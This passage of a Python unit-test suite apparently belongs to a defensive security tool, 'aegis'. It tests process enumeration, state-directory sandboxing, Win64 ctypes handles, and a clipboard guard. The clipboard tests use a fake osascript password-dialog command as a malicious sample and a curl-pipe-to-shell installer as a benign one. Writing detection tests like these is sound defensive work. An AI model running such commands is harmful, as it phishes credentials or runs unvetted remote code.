        # Pre-fix this ratio was ~47%. Allow generous headroom for processes
        # that genuinely exit mid-enumeration; the point is that truncation is
        # no longer systematic.
        self.assertLess(missing / float(total), 0.15,
                        "%d of %d absolute exe paths do not exist — comm looks "
                        "truncated again" % (missing, total))

    def test_a_long_path_survives_the_join(self):
        """A synthetic table whose comm is far longer than 16 characters must
        come back whole."""
        long_path = "/tmp/" + ("a" * 60) + "/payload-binary"
        fake = ("1234 501 %s\n" % long_path, "", 0)
        fake_argv = ("1234 %s --flag\n" % long_path, "", 0)

        def fake_run(cmd, timeout=15, extra_env=None):
            fmt = cmd[2] if len(cmd) > 2 else ""
            return fake_argv if ("args=" in fmt and "uid=" not in fmt) else fake

        saved = aegis.run
        aegis.run = fake_run
        try:
            rows = list(aegis._iter_processes())
        finally:
            aegis.run = saved
        self.assertEqual(1, len(rows), rows)
        self.assertEqual(long_path, rows[0][2])


class TestSandboxCoversEveryStatePath(unittest.TestCase):
    """Every module-level path under ~/.aegis must be redirected by the shared
    Sandbox, or the suite writes to the developer's real state directory.

    This is not hypothetical. The protective tier added NOTARY_FILE and
    OBSERVATIONS_DIR and wired both into cmd_scan; the legacy Sandbox predated
    them, so for one commit every scan-invoking test in the suite appended to
    the author's actual ~/.aegis — 154 observation snapshots and a 154-link
    notary chain — while the module docstring promised it 'NEVER touches real
    state'.

    Maintaining that list by hand is what failed. This derives it from the
    module instead, so a new state path fails here the moment it is added
    rather than silently escaping."""

    def test_no_module_state_path_escapes_the_sandbox(self):
        import test_regression

        real_state = os.path.realpath(aegis.STATE_DIR)
        # Every module global that is a string path living under STATE_DIR.
        under_state = set()
        for name in dir(aegis):
            if not name.isupper():
                continue
            value = getattr(aegis, name)
            if not isinstance(value, str) or not value:
                continue
            if os.path.realpath(value).startswith(real_state + os.sep):
                under_state.add(name)

        box = test_regression.Sandbox("run")
        box.setUp()
        try:
            covered = set(box._saved)
        finally:
            box.tearDown()

        # RUNTIME_SCRIPT is the installed copy of aegis.py itself; the installer
        # tests assert against it deliberately and never write it during a scan.
        escaping = under_state - covered - {"RUNTIME_SCRIPT"}
        self.assertEqual(set(), escaping,
                         "these ~/.aegis paths are not sandboxed, so any test "
                         "touching them writes real state: %s"
                         % sorted(escaping))


class TestWindowsProcessControlPrototypes(unittest.TestCase):
    """The Win64 handle-width contract, asserted as source structure because a
    macOS/Linux runner cannot execute the call.

    ctypes defaults restype to C int (32 bits) while a Win64 HANDLE is a 64-bit
    pointer, so an undeclared OpenProcess silently truncates its handle and then
    hands the truncated value to NtSuspendProcess and CloseHandle at the wrong
    width. Small handle values survive by luck — which is exactly what makes it
    a defect that passes review and fails on someone else's machine."""

    def test_handle_types_are_declared_not_left_to_ctypes_defaults(self):
        import inspect
        src = inspect.getsource(aegis._win_suspend_resume)
        self.assertIn("restype = ctypes.c_void_p", src,
                      "OpenProcess must declare a pointer-width restype")
        self.assertIn("argtypes = (ctypes.c_void_p,)", src,
                      "handle arguments must be declared pointer-width")
        self.assertIn("c_long", src, "NTSTATUS must be a signed long")
        # NTSTATUS success is >= 0, not == 0: informational statuses are
        # non-negative and must not be read as failure.
        self.assertIn(">= 0", src)

    def test_both_verbs_route_through_the_same_prototyped_helper(self):
        """A second hand-rolled ctypes call site is how the width bug comes
        back, so suspend and resume must share one declaration."""
        import inspect
        for fn in (aegis._suspend_pid, aegis._resume_pid):
            src = inspect.getsource(fn)
            self.assertIn("_win_suspend_resume", src)
            self.assertNotIn("windll", src)


class TestClipboardPlatformWiring(unittest.TestCase):
    """The per-OS clipboard plumbing, asserted without touching a real
    clipboard. These are the paths a macOS dev cannot exercise locally, which is
    exactly why they are pinned here."""

    def _capture(self, is_win=False, is_mac=False):
        calls = {}

        def fake_run(cmd, timeout=15, extra_env=None):
            calls["cmd"] = list(cmd)
            calls["env"] = dict(extra_env or {})
            return "", "", 0

        saved = {name: getattr(aegis, name)
                 for name in ("run", "IS_WIN", "IS_MAC", "IS_LINUX")}

        def restore():
            for name, value in saved.items():
                setattr(aegis, name, value)

        self.addCleanup(restore)
        aegis.run = fake_run
        aegis.IS_WIN, aegis.IS_MAC = is_win, is_mac
        aegis.IS_LINUX = not is_win and not is_mac
        return calls

    def test_windows_write_passes_text_by_environment_not_pipeline(self):
        """$input is the PIPELINE variable and is empty here, so a
        `Set-Clipboard -Value $input` would silently CLEAR the clipboard rather
        than substitute the inert notice. The value must arrive through
        extra_env, which is also this codebase's injection-safe channel — the
        string never reaches the command line, so no quoting can be turned
        against us."""
        calls = self._capture(is_win=True)
        aegis._clipboard_write("REPLACEMENT")
        joined = " ".join(calls["cmd"])
        self.assertIn("$env:AEGIS_CLIP", joined)
        self.assertNotIn("$input", joined)
        self.assertEqual("REPLACEMENT", calls["env"].get("AEGIS_CLIP"))
        # The payload must never be interpolated into the command itself.
        self.assertNotIn("REPLACEMENT", joined)

    def test_windows_read_uses_raw_so_newlines_survive(self):
        """A trailing \\r is the auto-execute tell the grammar keys on; a
        non-raw read would strip exactly the evidence that matters."""
        calls = self._capture(is_win=True)
        aegis._clipboard_read()
        self.assertIn("Get-Clipboard -Raw", " ".join(calls["cmd"]))


class TestClipboardBehaviour(ProtectiveSandbox):

    def test_clean_clipboard_content_is_never_persisted(self):
        """Password managers put secrets on the clipboard. A security tool that
        journals every clipboard it sees has become the thing it defends
        against, so non-matching content must leave no trace anywhere."""
        secret = "correct-horse-battery-staple"
        saved = aegis._clipboard_read
        aegis._clipboard_read = lambda: secret
        try:
            aegis.cmd_clipboard("check")
        finally:
            aegis._clipboard_read = saved
        for path in (aegis.CLIPBOARD_FILE, aegis.ACTION_LOG, aegis.RUN_LOG):
            if os.path.exists(path):
                with open(path, encoding="utf-8") as f:
                    self.assertNotIn(secret, f.read(), path)

    def test_guard_refuses_to_substitute_a_merely_suspect_pattern(self):
        """Silently rewriting rustup's own installer would break real work."""
        written = []
        saved_r, saved_w = aegis._clipboard_read, aegis._clipboard_write
        aegis._clipboard_read = lambda: "curl -sSf https://sh.rustup.rs | sh"
        aegis._clipboard_write = lambda t: written.append(t) or True
        try:
            aegis.cmd_clipboard("guard")
        finally:
            aegis._clipboard_read, aegis._clipboard_write = saved_r, saved_w
        self.assertEqual([], written, "a legitimate installer was rewritten")

    def test_guard_substitutes_a_certain_pattern_and_keeps_the_original(self):
        payload = ("osascript -e 'display dialog \"Password\" "
                   "with hidden answer'")
        written = []
        saved_r, saved_w = aegis._clipboard_read, aegis._clipboard_write
        aegis._clipboard_read = lambda: payload
        aegis._clipboard_write = lambda t: written.append(t) or True
        try:
            self.assertEqual(0, aegis.cmd_clipboard("guard"))
        finally:
            aegis._clipboard_read, aegis._clipboard_write = saved_r, saved_w
        self.assertEqual(1, len(written))
        self.assertIn("Aegis blocked", written[0])
        # Reversible: the original is held for a one-command restore.
        self.assertEqual(payload,
                         aegis.load_json(aegis.CLIPBOARD_FILE, {})["original"])


# --------------------------------------------------------------------------- #
# Hindsight (developer tooling)
# --------------------------------------------------------------------------- #
class TestScanPathStaysInsideStateDir(ProtectiveSandbox):
    """The trust model promises the background scan writes only inside
    ~/.aegis. This tier ADDED two scan-path writers (the notary link and the
    raw-observation snapshot) plus the auto-thaw sweep, so the promise is
    re-asserted here rather than assumed to have survived."""

    def test_notary_and_observations_write_only_under_state_dir(self):
        self._saved_anchor = aegis._notary_emit_anchor
        aegis._notary_emit_anchor = lambda seq, head: "stubbed"
        self.addCleanup(lambda: setattr(aegis, "_notary_emit_anchor",
                                        self._saved_anchor))
        with open(aegis.BASELINE, "w", encoding="utf-8") as f:
            f.write('{"persistence": {}}')

        before = self._snapshot(self.tmp)
        aegis.notary_append()
        aegis.record_observation("persistence.snapshot", {"a": 1})
        aegis._thaw_expired()
        after = self._snapshot(self.tmp)

        new = sorted(set(after) - set(before))
        self.assertTrue(new, "expected the writers to create something")
        state = os.path.realpath(self.state)
        for path in new:
            self.assertTrue(os.path.realpath(path).startswith(state),
                            "scan path wrote outside the state dir: %s" % path)

    @staticmethod
    def _snapshot(root):
        out = []
        for base, _dirs, files in os.walk(root):
            out.extend(os.path.join(base, f) for f in files)
        return out


class TestHindsight(ProtectiveSandbox):

    def test_observations_round_trip(self):
        aegis.record_observation("persistence.snapshot", {"a": {"label": "x"}})
        loaded = aegis._load_observations("persistence.snapshot", 30)
        self.assertEqual(1, len(loaded))
        self.assertEqual({"a": {"label": "x"}}, loaded[0][1])

    def test_rehunt_is_read_only_with_too_little_history(self):
        self.assertEqual(0, aegis.cmd_rehunt(30))
        self.assertFalse(os.path.exists(aegis.EVENT_DB),
                         "rehunt must not create durable state")

    def test_backtest_refuses_below_the_sample_floor(self):
        """Reporting a precision figure from a handful of labels is noise, and a
        rule promoted on noise is worse than one never measured. The refusal is
        the feature."""
        aegis.ensure_state()
        aegis.init_event_store()
        db = aegis._event_connection()
        try:
            with db:
                for _ in range(3):
                    db.execute(
                        "INSERT INTO dismissals(correlation_key,reason_code,"
                        "category,dismissed_at) VALUES(?,?,?,?)",
                        ("k", "false-positive", "persistence", aegis._epoch()))
        finally:
            db.close()
        import io
        import contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            aegis.cmd_backtest("persistence")
        self.assertIn("REFUSED", buf.getvalue())
        self.assertIn(str(aegis.BACKTEST_MIN_SAMPLES), buf.getvalue())


if __name__ == "__main__":
    unittest.main(verbosity=2)
